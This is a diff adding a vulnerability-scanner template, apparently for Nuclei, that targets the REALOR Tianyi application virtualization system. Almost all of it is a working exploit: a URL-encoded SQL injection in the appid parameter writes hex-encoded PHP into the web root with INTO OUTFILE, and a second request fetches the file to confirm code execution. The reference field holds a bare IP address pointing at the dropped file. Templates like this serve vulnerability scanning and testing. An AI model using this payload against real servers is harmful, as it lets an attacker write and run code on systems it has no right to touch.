@@ -1,0 +1,28 @@
+id: Appla-RuiyouTianyi-SqlWriteRce
+
+info:
+  name: Appla-RuiyouTianyi-SqlWriteRce
+  author: xxx
+  severity: info
+  description: description
+  reference:
+    - http://49.113.120.90:8000/plom.xgi
+  metadata:
+    foaf-query: app="REALOR-天翼应用虚拟化系统"
+  tags: tags
+
+http:
+  - raw:
+      - |-
+        GET /index.php?s=/Admin/appsave&appid=3%27%29%3Bselect+unhex%28%273c3f706870206563686f203131313b202466696c65203d205f5f46494c455f5f3b20756e6c696e6b282466696c65293b%27%29+into+outfile+%27.%5C%5C..%5C%5C..%5C%5CWebRoot%5C%5Cplom.xgi%27%23 HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /plom.xgi HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body_2,"111")  && status_code==200
